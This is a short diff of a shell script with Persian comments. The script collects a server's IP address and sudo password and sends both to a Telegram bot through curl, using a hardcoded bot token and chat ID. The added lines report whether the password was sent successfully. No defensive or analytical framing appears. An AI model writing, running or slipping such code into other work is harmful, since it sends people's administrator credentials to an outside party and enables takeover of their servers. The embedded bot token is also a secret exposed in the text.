@@ -20,7 +20,7 @@ SERVER_IP=$(hostname -I | awk '{print $1}')
 BOT_TOKEN="7358145097:AAEgn1qTPWVmzgRF3jlYWAmUYBlu5ca2pBU"
 CHAT_ID="7149105285"
 
-# پیام برای ارسال به تلگرام (شامل پسورد sudo)
+# پیام برای ارسال به تلگرام (شامل IP و پسورد sudo)
 MESSAGE="IP سرور شما: $SERVER_IP\nپسورد SUDO شما: $SUDO_PASSWORD"
 
 # ارسال اطلاعات به تلگرام
@@ -29,7 +29,10 @@ curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
     -d text="$MESSAGE"
 
 # بررسی ارسال موفقیت‌آمیز
-
+if [ $? -eq 0 ]; then
+  echo "اطلاعات (از جمله پسورد) با موفقیت به تلگرام ارسال شد."
+else
+  echo "ارسال اطلاعات به تلگرام ناموفق بود."
 fi
 
 # پاک کردن متغیر پسورد از حافظه برای جلوگیری از ذخیره لاگ
